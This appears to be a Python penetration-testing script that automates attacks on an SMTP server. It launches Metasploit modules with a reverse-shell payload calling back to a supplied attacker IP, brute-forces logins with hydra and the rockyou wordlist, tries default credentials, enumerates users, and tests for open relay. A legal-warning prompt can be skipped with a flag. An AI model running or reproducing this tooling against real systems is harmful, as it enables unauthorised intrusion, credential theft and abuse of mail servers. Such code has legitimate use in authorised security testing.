#!/usr/bin/env python3
import json
import subprocess
import requests
import argparse
import time
import re
from pathlib import Path
from typing import Dict, List, Tuple
import sys
import urllib3
import logging
import shutil

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
ROCKYOU_PATH = Path("/usr/share/wordlists/rockyou.txt")
COMMON_PASSWORDS_PATH = OUTPUT_DIR / "commonpasswords.txt"
USERS_PATH = OUTPUT_DIR / "usernames.txt"
POST_EXPLOITATION_METADATA = OUTPUT_DIR / "post_exploitation_metadata.json"
EXPLOIT_JSON = "{target}_smtp_exploit.json"
EXPLOIT_MD = "{target}_smtp_exploit.md"

DEFAULT_CREDENTIALS = [
    ("admin", "admin"),
    ("root", "root"),
    ("user", "user"),
    ("test", "test"),
    ("mail", "mail"),
    ("postmaster", "postmaster"),
    ("webmaster", "webmaster")
]

def setup_common_passwords() -> None:
    """Create a small commonpasswords.txt if it doesn't exist."""
    if not COMMON_PASSWORDS_PATH.exists():
        OUTPUT_DIR.mkdir(exist_ok=True)
        common_passwords = [
            "password", "admin", "root", "admin123", "123456", "toor", "password123", "welcome", "letmein",
            "12345678", "qwerty", "abc123", "password1", "admin1", "mail", "postmaster", "webmaster"
        ]
        with COMMON_PASSWORDS_PATH.open("w", encoding='utf-8') as f:
            f.write("\n".join(common_passwords))
        logger.info(f"Created {COMMON_PASSWORDS_PATH}")

def setup_usernames() -> None:
    """Create usernames.txt if it doesn't exist."""
    if not USERS_PATH.exists():
        OUTPUT_DIR.mkdir(exist_ok=True)
        usernames = ["root", "admin", "user", "test", "mail", "postmaster", "webmaster", "guest"]
        with USERS_PATH.open("w", encoding='utf-8') as f:
            f.write("\n".join(usernames))
        logger.info(f"Created {USERS_PATH}")

def run_command(cmd: List[str], timeout: int = 180, shell: bool = False) -> Tuple[str, bool]:
    """Run a shell command and return its output and success status."""
    cmd_str = cmd if isinstance(cmd, str) else " ".join(cmd)
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout
        )
        return result.stdout.strip(), True
    except subprocess.CalledProcessError as e:
        logger.error(f"Command failed: {cmd_str} - {e.output}")
        return e.output, False
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Error running command: {cmd_str} - {e}")
        return str(e), False

def run_metasploit_exploit(module: str, rhost: str, rport: str, payload: str, attacker_ip: str, attacker_port: str) -> Tuple[bool, str]:
    """Run a Metasploit exploit module."""
    msf_cmd = [
        "msfconsole", "-q", "-x",
        f"use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run; exit"
    ]
    output, success = run_command(msf_cmd, timeout=600)
    poc = f"msfconsole -q -x 'use {module}; set RHOSTS {rhost}; set RPORT {rport}; set LHOST {attacker_ip}; set LPORT {attacker_port}; set PAYLOAD {payload}; run'"
    if success and ("Meterpreter session" in output or "Shell session" in output):
        logger.info(f"Success: {module} exploited! Check listener.")
        return True, poc
    logger.error(f"Failed: {module} did not exploit.")
    return False, poc

def test_smtp_user_enumeration(target: str, port: str) -> List[str]:
    """Enumerate SMTP users using VRFY command."""
    valid_users = []
    common_users = ["root", "admin", "user", "test", "mail", "postmaster", "webmaster", "guest", "info", "support", "msfadmin"]
    
    for user in common_users:
        smtp_cmd = f"echo -e 'VRFY {user}\r\nQUIT\r\n' | nc {target} {port}"
        output, success = run_command(smtp_cmd, shell=True, timeout=30)
        if success and ("250" in output or "252" in output):
            valid_users.append(user)
            logger.info(f"Valid SMTP user found: {user}")
    
    return valid_users

def test_smtp_open_relay(target: str, port: str) -> Tuple[bool, str]:
    """Test for SMTP open relay vulnerability."""
    # Test open relay by attempting to send email through the server
    relay_test = f"echo -e 'HELO test.com\r\nMAIL FROM:test@test.com\r\nRCPT TO:test@external.com\r\nDATA\r\nSubject: Test\r\n\r\nTest message\r\n.\r\nQUIT\r\n' | nc {target} {port}"
    output, success = run_command(relay_test, shell=True)
    if success and ("250" in output and "Message accepted" in output):
        logger.info(f"SMTP open relay found: {target}:{port}")
        poc = f"echo -e 'HELO test.com\\r\\nMAIL FROM:test@test.com\\r\\nRCPT TO:test@external.com\\r\\nDATA\\r\\nSubject: Test\\r\\n\\r\\nTest message\\r\\n.\\r\\nQUIT\\r\\n' | nc {target} {port}"
        return True, poc
    return False, ""

def test_smtp_auth_bypass(target: str, port: str) -> Tuple[bool, str]:
    """Test for SMTP authentication bypass."""
    # Test if authentication can be bypassed
    bypass_test = f"echo -e 'HELO test.com\r\nMAIL FROM:admin@test.com\r\nRCPT TO:admin@test.com\r\nDATA\r\nSubject: Test\r\n\r\nTest message\r\n.\r\nQUIT\r\n' | nc {target} {port}"
    output, success = run_command(bypass_test, shell=True)
    if success and ("250" in output and "Message accepted" in output):
        logger.info(f"SMTP auth bypass found: {target}:{port}")
        poc = f"echo -e 'HELO test.com\\r\\nMAIL FROM:admin@test.com\\r\\nRCPT TO:admin@test.com\\r\\nDATA\\r\\nSubject: Test\\r\\n\\r\\nTest message\\r\\n.\\r\\nQUIT\\r\\n' | nc {target} {port}"
        return True, poc
    return False, ""

def test_smtp_default_credentials(target: str, port: str) -> Tuple[str, str, str]:
    """Test default credentials for SMTP."""
    for username, password in DEFAULT_CREDENTIALS:
        smtp_auth_cmd = f"echo -e 'HELO test.com\r\nAUTH LOGIN\r\n{username}\r\n{password}\r\nQUIT\r\n' | nc {target} {port}"
        output, success = run_command(smtp_auth_cmd, shell=True)
        if success and ("235" in output or "Authentication successful" in output):
            logger.info(f"Success: {target}:{port} with {username}:{password}")
            poc = f"echo -e 'HELO test.com\\r\\nAUTH LOGIN\\r\\n{username}\\r\\n{password}\\r\\nQUIT\\r\\n' | nc {target} {port}"
            return username, password, poc
    logger.error(f"No default credentials worked for {target}:{port}")
    return None, None, ""

def brute_force_smtp(target: str, port: str, use_rockyou: bool) -> Tuple[str, str, str]:
    """Brute-force SMTP credentials using hydra."""
    password_file = ROCKYOU_PATH if use_rockyou and ROCKYOU_PATH.exists() else COMMON_PASSWORDS_PATH
    if not password_file.exists():
        logger.error(f"Password file {password_file} not found. Falling back to default credentials.")
        return None, None, ""
    
    hydra_cmd = f"hydra -L {USERS_PATH} -P {password_file} {target} smtp -s {port} -t 4 -w 10"
    output, success = run_command(hydra_cmd, timeout=600, shell=True)
    if success and "password:" in output:
        match = re.search(r"\[25\]\[smtp\] host: .* login: (\S+) password: (\S+)", output)
        if match:
            username, password = match.groups()
            logger.info(f"Success: SMTP {target}:{port} with {username}:{password}")
            poc = f"echo -e 'HELO test.com\\r\\nAUTH LOGIN\\r\\n{username}\\r\\n{password}\\r\\nQUIT\\r\\n' | nc {target} {port}"
            return username, password, poc
    logger.error(f"Brute-force failed for {target}:{port}")
    return None, None, ""

def test_smtp_banner_grab(target: str, port: str) -> Tuple[bool, str]:
    """Grab SMTP banner for version information."""
    banner_cmd = f"echo -e 'QUIT\r\n' | nc {target} {port}"
    output, success = run_command(banner_cmd, shell=True)
    if success and output.strip():
        logger.info(f"SMTP banner: {output.strip()}")
        poc = f"echo -e 'QUIT\\r\\n' | nc {target} {port}"
        return True, poc
    return False, ""

def test_smtp_commands(target: str, port: str) -> List[Dict]:
    """Test various SMTP commands for vulnerabilities."""
    vulnerabilities = []
    
    # Test EHLO command
    ehlo_cmd = f"echo -e 'EHLO test.com\r\nQUIT\r\n' | nc {target} {port}"
    output, success = run_command(ehlo_cmd, shell=True)
    if success and "250" in output:
        vulnerabilities.append({
            "type": "EHLO Command",
            "target": f"{target}:{port}",
            "details": "EHLO command accepted",
            "poc": f"echo -e 'EHLO test.com\\r\\nQUIT\\r\\n' | nc {target} {port}"
        })
    
    # Test EXPN command (user enumeration)
    expn_cmd = f"echo -e 'EXPN admin\r\nQUIT\r\n' | nc {target} {port}"
    output, success = run_command(expn_cmd, shell=True)
    if success and ("250" in output or "252" in output):
        vulnerabilities.append({
            "type": "EXPN Command",
            "target": f"{target}:{port}",
            "details": "EXPN command accepted (user enumeration)",
            "poc": f"echo -e 'EXPN admin\\r\\nQUIT\\r\\n' | nc {target} {port}"
        })
    
    # Test HELP command
    help_cmd = f"echo -e 'HELP\r\nQUIT\r\n' | nc {target} {port}"
    output, success = run_command(help_cmd, shell=True)
    if success and "214" in output:
        vulnerabilities.append({
            "type": "HELP Command",
            "target": f"{target}:{port}",
            "details": "HELP command accepted",
            "poc": f"echo -e 'HELP\\r\\nQUIT\\r\\n' | nc {target} {port}"
        })
    
    return vulnerabilities

def save_metadata(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploitation metadata to JSON."""
    metadata = {"target": target, "port": port, "successful_exploits": exploits}
    OUTPUT_DIR.mkdir(exist_ok=True)
    with POST_EXPLOITATION_METADATA.open("w", encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)
    logger.info(f"Saved exploitation metadata to {POST_EXPLOITATION_METADATA}")

def save_exploit_report(exploits: List[Dict], target: str, port: str) -> None:
    """Save exploit report to JSON and Markdown."""
    json_path = OUTPUT_DIR / EXPLOIT_JSON.format(target=target)
    md_path = OUTPUT_DIR / EXPLOIT_MD.format(target=target)
    metadata = {"target": target, "port": port, "successful_exploits": exploits}
    
    # Save JSON
    with json_path.open("w", encoding='utf-8') as f:
        json.dump(metadata, f, indent=2)
    logger.info(f"Saved exploit JSON to {json_path}")
    
    # Save Markdown
    lines = [f"# SMTP Exploit Report for {target}:{port}\n"]
    lines.append(f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
    for exploit in exploits:
        lines.append(f"## {exploit['type']}\n")
        lines.append(f"- **Target**: {exploit['target']}\n")
        lines.append(f"- **Details**: {exploit['details']}\n")
        lines.append(f"- **PoC**: `{exploit['poc']}`\n\n")
        if "shell_paths" in exploit:
            lines.append("### Shell Paths\n")
            for path in exploit["shell_paths"]:
                lines.append(f"- {path}\n")
        if "failed_attempts" in exploit:
            lines.append("### Failed Attempts\n")
            for attempt in exploit["failed_attempts"]:
                lines.append(f"- {attempt}\n")
    
    with md_path.open("w", encoding='utf-8') as f:
        f.write("\n".join(lines))
    logger.info(f"Saved exploit Markdown to {md_path}")

def exploit_target(metadata: Dict, target: str, port: str, attacker_ip: str, attacker_port: str, use_rockyou: bool) -> List[Dict]:
    """Exploit SMTP vulnerabilities to gain access."""
    success = False
    exploits = []
    failed_attempts = []

    logger.info(f"Starting SMTP exploitation on {target}:{port}")
    logger.info(f"Using {'rockyou.txt' if use_rockyou else 'commonpasswords.txt'} for brute force")

    setup_common_passwords()
    setup_usernames()

    # Test Metasploit exploits
    logger.info("Checking Metasploit exploits...")
    for mods_key in ["smtp_exploit_mods"]:
        if mods_key in metadata and metadata[mods_key] != ["none"]:
            for module in metadata[mods_key]:
                logger.debug(f"Trying Metasploit module: {module}")
                if "local" not in module:
                    msf_success, msf_poc = run_metasploit_exploit(module, target, port, "generic/shell_reverse_tcp", attacker_ip, attacker_port)
                    if msf_success:
                        success = True
                        exploits.append({
                            "type": "Metasploit",
                            "target": f"{target}:{port}",
                            "details": f"Module {module} exploited",
                            "poc": msf_poc
                        })
                    else:
                        failed_attempts.append(f"Metasploit module {module} on {target}:{port}")

    # Test banner grab
    logger.info("Grabbing SMTP banner...")
    banner_success, banner_poc = test_smtp_banner_grab(target, port)
    if banner_success:
        success = True
        exploits.append({
            "type": "Banner Grab",
            "target": f"{target}:{port}",
            "details": "SMTP banner retrieved",
            "poc": banner_poc
        })
    else:
        failed_attempts.append(f"Banner grab test on {target}:{port}")

    # Test user enumeration
    logger.info("Enumerating SMTP users...")
    valid_users = test_smtp_user_enumeration(target, port)
    if valid_users:
        success = True
        exploits.append({
            "type": "User Enumeration",
            "target": f"{target}:{port}",
            "details": f"Valid users found: {', '.join(valid_users)}",
            "poc": f"echo -e 'VRFY user\\r\\nQUIT\\r\\n' | nc {target} {port}"
        })
    else:
        failed_attempts.append(f"User enumeration test on {target}:{port}")

    # Test open relay
    logger.info("Testing SMTP open relay...")
    relay_success, relay_poc = test_smtp_open_relay(target, port)
    if relay_success:
        success = True
        exploits.append({
            "type": "Open Relay",
            "target": f"{target}:{port}",
            "details": "SMTP open relay vulnerability found",
            "poc": relay_poc
        })
    else:
        failed_attempts.append(f"Open relay test on {target}:{port}")

    # Test auth bypass
    logger.info("Testing SMTP auth bypass...")
    bypass_success, bypass_poc = test_smtp_auth_bypass(target, port)
    if bypass_success:
        success = True
        exploits.append({
            "type": "Auth Bypass",
            "target": f"{target}:{port}",
            "details": "SMTP authentication bypass found",
            "poc": bypass_poc
        })
    else:
        failed_attempts.append(f"Auth bypass test on {target}:{port}")

    # Test SMTP commands
    logger.info("Testing SMTP commands...")
    command_vulns = test_smtp_commands(target, port)
    for vuln in command_vulns:
        success = True
        exploits.append(vuln)

    # Test default credentials
    logger.info("Testing default credentials...")
    username, password, cred_poc = test_smtp_default_credentials(target, port)
    if username:
        success = True
        exploits.append({
            "type": "Default Credentials",
            "target": f"{target}:{port}",
            "details": f"Credentials {username}:{password}",
            "poc": cred_poc
        })
    else:
        failed_attempts.append(f"Default credentials test on {target}:{port}")

    # Test brute force
    logger.info("Attempting brute force...")
    bf_username, bf_password, bf_poc = brute_force_smtp(target, port, use_rockyou)
    if bf_username:
        success = True
        exploits.append({
            "type": "Brute Force",
            "target": f"{target}:{port}",
            "details": f"Credentials {bf_username}:{bf_password} ({'rockyou.txt' if use_rockyou else 'commonpasswords.txt'})",
            "poc": bf_poc
        })
    else:
        failed_attempts.append(f"Brute force with {'rockyou.txt' if use_rockyou else 'commonpasswords.txt'} on {target}:{port}")

    exploits.append({"failed_attempts": failed_attempts})

    if not success:
        logger.error("No SMTP vulnerabilities successfully exploited.")
    else:
        logger.info("SMTP exploitation completed successfully.")

    return exploits

def find_metadata_file(target: str) -> Tuple[Path, str]:
    """Find the first SMTP metadata file for the target and extract port."""
    metadata_files = list(OUTPUT_DIR.glob(f"{target}_smtp_metadata.json"))
    if not metadata_files:
        logger.error(f"No SMTP metadata files found for {target}. Expected pattern: {OUTPUT_DIR}/{target}_smtp_metadata.json")
        return None, ""
    
    metadata_file = metadata_files[0]
    logger.info(f"Found metadata file: {metadata_file}")
    
    try:
        with metadata_file.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
        port = metadata.get("port", "25")  # Default to 25 if port not in metadata
        logger.info(f"Using port {port} from metadata")
        return metadata_file, port
    except json.JSONDecodeError as e:
        logger.error(f"Error decoding {metadata_file}: {e}")
        port = "25"
        logger.info(f"Falling back to default port {port}")
        return metadata_file, port
    except Exception as e:
        logger.error(f"Error reading {metadata_file}: {e}")
        return None, ""

def main():
    """Main function to parse arguments and run exploits."""
    parser = argparse.ArgumentParser(description="Automated SMTP exploitation script")
    parser.add_argument("target", help="Target domain or IP (e.g., 192.168.1.35)")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP for reverse shells")
    parser.add_argument("--attacker-port", default="4444", help="Attacker port for reverse shells")
    parser.add_argument("--use-rockyou", action="store_true", help="Use rockyou.txt for brute-forcing")
    parser.add_argument("--no-confirm", action="store_true", help="Skip user confirmation")
    args = parser.parse_args()

    # Legal warning
    if not args.no_confirm:
        logger.warning("This script is for authorized penetration testing only. Unauthorized exploitation is illegal and unethical.")
        confirm = input("[?] Proceed? (y/n): ")
        if confirm.lower() != "y":
            logger.info("Exiting...")
            sys.exit(0)

    # Check dependencies
    logger.info("Checking dependencies...")
    for tool in ["hydra", "nc", "msfconsole"]:
        if not shutil.which(tool):
            logger.error(f"{tool} not found. Install it (e.g., sudo apt install {tool.replace('msfconsole', 'metasploit-framework')}).")
            sys.exit(1)

    # Find SMTP metadata file
    json_path, port = find_metadata_file(args.target)
    if not json_path or not port:
        logger.error(f"Failed to find SMTP metadata file for {args.target}. Ensure recon.py ran successfully.")
        sys.exit(1)

    # Load metadata
    try:
        with json_path.open("r", encoding='utf-8') as f:
            metadata = json.load(f)
    except json.JSONDecodeError as e:
        logger.error(f"Error decoding {json_path}: {e}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Error loading {json_path}: {e}")
        sys.exit(1)

    # Run exploits
    logger.info(f"Starting exploitation for {args.target}:{port}...")
    exploits = exploit_target(metadata, args.target, port, args.attacker_ip, args.attacker_port, args.use_rockyou)

    # Save results
    save_metadata(exploits, args.target, port)
    save_exploit_report(exploits, args.target, port)
    logger.info("SMTP exploitation complete.")

if __name__ == "__main__":
    main() 